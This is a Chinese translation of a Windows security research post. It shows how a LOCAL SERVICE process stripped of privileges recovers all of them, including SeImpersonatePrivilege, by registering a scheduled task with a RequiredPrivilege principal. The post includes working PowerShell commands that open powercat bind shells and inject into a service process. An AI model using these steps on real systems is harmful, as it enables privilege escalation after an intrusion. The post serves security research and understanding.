> 原文链接: https://www.anquanke.com//post/id/194452 


# 如何绕过LocalServiceAndNoImpersonation拿回全部特权


                                阅读量   
                                **1290232**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者itm4n，文章来源：itm4n.github.io
                                <br>原文地址：[https://itm4n.github.io/localservice-privileges/](https://itm4n.github.io/localservice-privileges/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p2.ssl.qhimg.com/t0189cd18f8bd9b9597.jpg)](https://p2.ssl.qhimg.com/t0189cd18f8bd9b9597.jpg)



## 0x00 前言

几周之前，来自NCC Group的Phillip Langlois和Edward Torkington公布UPnP Device Host服务中的一个提权漏洞（[原文](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/)，[译文](https://www.anquanke.com/post/id/193022)）。如果大家对Windows上的提权漏洞感兴趣，千万不能错过这篇文章。Phillip Langlois和Edward Torkington介绍了如何利用该服务公开的一个COM对象成功在`NT AUTHORITY\LOCAL SERVICE`上下文中实现任意代码执行。

在这种情况下，由于服务账户具备模拟（impersonation）功能，因此通常情况下我们能将权限提升至`NT AUTHORITY\SYSTEM`。然而，实际情况并没有想象的那么简单。

> 在Windows 10上，UPnP Device Host服务的`ServiceSidType`设置为`SERVICE_SID_TYPE_UNRESTRICTED`，无需模拟权限就能以`NT AUTHORITY\LOCAL SERVICE`用户身份执行。不幸的是，这样我们就无法通过常见方法将权限提升至`NT AUTHORITY\SYSTEM`。

如果检查该服务的属性，可以看到执行路径中包含`-k LocalServiceAndNoImpersonation`选项：

[![](https://p4.ssl.qhimg.com/t010956875e3b0201ac.png)](https://p4.ssl.qhimg.com/t010956875e3b0201ac.png)

检查与该进程关联的令牌，可以看到的确只有两个特权：

[![](https://p0.ssl.qhimg.com/t01dac756ed68133a7f.png)](https://p0.ssl.qhimg.com/t01dac756ed68133a7f.png)

而其他服务则是使用`-k LocalService`选项运行，比如Bluetooth Support服务：

[![](https://p4.ssl.qhimg.com/t010d884ce1ccca702f.png)](https://p4.ssl.qhimg.com/t010d884ce1ccca702f.png)

这种情况下，我们能够看到与`NT AUTHORITY\LOCAL SERVICE`账户有关的特权：

[![](https://p4.ssl.qhimg.com/t0138af08deee092d84.png)](https://p4.ssl.qhimg.com/t0138af08deee092d84.png)

> 注意：这里要提醒一下，特权的`Enabled`/`Disabled`状态其实并不关键，关键的是令牌中具备哪些特权。如果令牌中包含某个特权，我们可以在运行时根据需要启用或者禁用该特权。

在这种情况下，对于UPnP Device Host之类的服务，我们能否找到方法重新夺回所有特权呢？答案是肯定的（否则本文就没有任何存在意义了），并且实现起来也特别简单。



## 0x01 环境复现

为了复现UPnP Device Host服务漏洞的利用环境，我使用NirSoft提供的[`RunFromProcess`](https://www.nirsoft.net/utils/run_from_process.html)工具以服务子进程的方式打开一个bindshell，该操作需要管理员权限，bindshell我使用的是[`powercat`](https://github.com/besimorhino/powercat)。`powercat`是PowerShell版的`netcat`实现，作为渗透测试人员，这是必不可少的一款工具。

`RunFromProcess`的用法非常简单，第一个参数为待运行可执行文件的宿主进程的PID，第二个参数为可执行文件的绝对路径，然后我们可以附加可执行文件需要的一些参数。

```
C:\TOOLS&gt;RunFromProcess-x64.exe 3636 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -Command ". C:\TOOLS\powercat.ps1;powercat -l -p 7001 -ep"
```

要注意的是，工具没有给出是否运行成功的信息，因此我们在运行之前要多检查几次命令。完成该操作后，我们可以使用“客户端模式”的`powercat`连接bindshell。

```
. .\powercat.ps1
powercat -c 127.0.0.1 -p 7001
```

[![](https://p4.ssl.qhimg.com/t0175e1ee3d1f3c40c8.png)](https://p4.ssl.qhimg.com/t0175e1ee3d1f3c40c8.png)

非常好，现在我们的shell已经运行在`NT AUTHORITY\SERVICE`上下文中，并且从上图中我们只看到两个特权。现在我们可以开展后续研究。



## 0x02 利用计划任务

在Windows系统中，任何用户都可以创建自己的计划任务，`NT AUTHORITY\LOCAL SERVICE`也不例外。默认情况下，我们可以把用来运行某个任务的账户当成该任务的“作者”。Windows会通过一系列本地（或者远程）RPC调用来完成计划任务创建过程，但这不是本文重点，不再赘述。

来看一下当我们在`LOCAL SERVICE`账户的上下文中创建任务会出现什么情况。我们可以使用PowerShell，通过3个简单的步骤完成该操作：

首先，我们需要为任务创建一个`Action`对象，其中我们可以指定待运行的程序/脚本以及某些可选参数。这里我们想在`7002`端口上打开bindshell，因此可以使用如下命令：

```
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `". C:\TOOLS\powercat.ps1; powercat -l -p 7002 -ep`""
```

然后，我们可以“注册”并手动启动任务：

```
Register-ScheduledTask -Action $TaskAction -TaskName "SomeTask"
Start-ScheduledTask -TaskName "SomeTask"
```

[![](https://p2.ssl.qhimg.com/t0163710b7fe2aee244.png)](https://p2.ssl.qhimg.com/t0163710b7fe2aee244.png)

现在再次使用客户端模式的`powercat`，连接到新的bindshell：

```
. .\powercat.ps1
powercat -c 127.0.0.1 -p 7002
```

[![](https://p0.ssl.qhimg.com/t012ad2db78e50ca7ab.png)](https://p0.ssl.qhimg.com/t012ad2db78e50ca7ab.png)

从上图可知，我们竟然拿回了所有特权！

稍等片刻，我们真的拿回了**所有**特权吗？

根据微软[官方文档](https://docs.microsoft.com/en-us/windows/win32/services/localservice-account)，本地服务账户默认情况下具备如下特权：
<li>
`SE_ASSIGNPRIMARYTOKEN_NAME` （disabled）</li>
<li>
`SE_AUDIT_NAME` （disabled）</li>
<li>
`SE_CHANGE_NOTIFY_NAME` （enabled）</li>
<li>
`SE_CREATE_GLOBAL_NAME` （enabled）</li>
<li>
`SE_IMPERSONATE_NAME` （enabled）</li>
<li>
`SE_INCREASE_QUOTA_NAME` （disabled）</li>
<li>
`SE_SHUTDOWN_NAME` （disabled）</li>
<li>
`SE_UNDOCK_NAME` （disabled）</li>
- 以及分配给普通用户及认证用户的其他特权
除了`SE_IMPERSONATE_NAME`外，我们已经看到了其他特权，这是为什么？



## 0x03 更进一步

目前我们掌握`SE_ASSIGNPRIMARYTOKEN_NAME`及`SE_INCREASE_QUOTA_NAME`特权，这对模拟任何用户来说已经足够，因此我们算是已经完成任务。然而我对`SE_IMPERSONATE_NAME`的缺失仍然耿耿于怀。

因此，我专门花了点时间浏览微软文档，希望找到合理的解释。功夫不负有心人，官方文档中包含关于“强化任务安全性”的一个小[章节](https://docs.microsoft.com/en-us/windows/win32/taskschd/task-security-hardening)，在章节末尾可以看到如下内容：

> 如果任务定义中不包含`RequiredPrivileges`，那么任务进程将会使用任务主体账户（task principal account）的默认特权（其中不包含`SeImpersonatePrivilege`）。如果任务定义中不包含`ProcessTokenSidType`，那么就会使用`unrestricted`作为默认值。

简而言之，答案包含两种情况：
- 任务进程使用任务主体账户的默认权限创建；
- 如果不存在`RequiredPrivileges`，那么就会使用该账户关联的默认特权（不包含`SeImpersonatePrivilege`）。
这样就能解释为什么我们能简单通过创建计划任务拿回特权（除了`SeImpersonatePrivilege`）。然而，这又带来了另一个问题：`RequiredPrivileges`是什么？有什么作用？

如果查看`Register-ScheduledTask` PowerShell命令的文档，会发现该命令可以接受一个`Principal`可选参数。我们可以使用`Principal`参数，在特定账户的安全上下文中运行任务。

我们可以使用`New-ScheduledTaskPrincipal`命令来创建`Principal`，该命令接受如下参数：

```
New-ScheduledTaskPrincipal
   [[-Id] &lt;String&gt;]
   [[-RunLevel] &lt;RunLevelEnum&gt;]
   [[-ProcessTokenSidType] &lt;ProcessTokenSidTypeEnum&gt;]
   [[-RequiredPrivilege] &lt;String[]&gt;]
   [-UserId] &lt;String&gt;
   [[-LogonType] &lt;LogonTypeEnum&gt;]
   [-CimSession &lt;CimSession[]&gt;]
   [-ThrottleLimit &lt;Int32&gt;]
   [-AsJob]
   [&lt;CommonParameters&gt;]
```

这就是微软在“强化任务安全性”中提到的`RequiredPrivilege`选项，该参数指定了计划任务在运行与主体关联的任务时所使用的用户权限数组。

> 备注：大家可以访问[此处](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)了解完整的特权常量。

了解这些知识点后，现在我们可以开始试验一下。

首先，我们创建包含所有特权的`String`数组，然而将该数组以参数形式传递给`New-ScheduledTaskPrincipal`，用来创建适用于新计划任务的`Principal`对象。

```
# Create a list of privileges 
[System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeImpersonatePrivilege", "SeIncreaseQuotaPrivilege", "SeShutdownPrivilege", "SeUndockPrivilege", "SeIncreaseWorkingSetPrivilege", "SeTimeZonePrivilege"
# Create a Principal for the task 
$TaskPrincipal = New-ScheduledTaskPrincipal -UserId "LOCALSERVICE" -LogonType ServiceAccount -RequiredPrivilege $Privs
```

然后，使用与前文相同的命令，通过正确的参数指定我们的`Principal`对象：

```
# Create an action for the task 
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `". C:\TOOLS\powercat.ps1; powercat -l -p 7003 -ep`""
# Create the task
Register-ScheduledTask -Action $TaskAction -TaskName "SomeTask2" -Principal $TaskPrincipal
# Start the task
Start-ScheduledTask -TaskName "SomeTask2"
```

[![](https://p3.ssl.qhimg.com/t01d96258c2a25771dd.png)](https://p3.ssl.qhimg.com/t01d96258c2a25771dd.png)

非常好，至少没有触发任何错误或异常。接下来试着连接新的bindshell，看一下是否能达到预期效果：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t016be1831fbacaa740.png)

的确成功了！我们最终拿回了`SeImpersonatePrivilege`权限。



## 0x04 总结

Windows是一个非常复杂的操作系统，多年以来，微软一直在加强该系统的安全性，同时努力保持与旧版本系统的兼容性。事实证明这个任务非常艰难，因为旧版本系统可能会破坏新的安全模型。



## 0x05 参考链接及资源
<li>CVE-2019-1405 and CVE-2019-1322 – Elevation to SYSTEM via the UPnP Device Host Service and the Update Orchestrator Service<br>[https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/)
</li>
<li>Enabling and Disabling Privileges in C++<br>[https://docs.microsoft.com/en-us/windows/win32/secauthz/enabling-and-disabling-privileges-in-c–](https://docs.microsoft.com/en-us/windows/win32/secauthz/enabling-and-disabling-privileges-in-c--)
</li>
<li>NirSoft – RunFromProcess Tool<br>[https://www.nirsoft.net/utils/run_from_process.html](https://www.nirsoft.net/utils/run_from_process.html)
</li>
<li>powercat<br>[https://github.com/besimorhino/powercat](https://github.com/besimorhino/powercat)
</li>
<li>MSDN – LocalService Account<br>[https://docs.microsoft.com/en-us/windows/win32/services/localservice-account](https://docs.microsoft.com/en-us/windows/win32/services/localservice-account)
</li>
<li>MSDN – Task Security Hardening<br>[https://docs.microsoft.com/en-us/windows/win32/taskschd/task-security-hardening](https://docs.microsoft.com/en-us/windows/win32/taskschd/task-security-hardening)
</li>
<li>MSDN – PowerShell – Register-ScheduledTask<br>[https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/register-scheduledtask?view=win10-ps](https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/register-scheduledtask?view=win10-ps)
</li>
<li>MSDN – PowerShell – New-ScheduledTaskPrincipal<br>[https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/new-scheduledtaskprincipal?view=win10-ps](https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/new-scheduledtaskprincipal?view=win10-ps)
</li>
<li>MSDN – Privilege Constants<br>[https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
</li>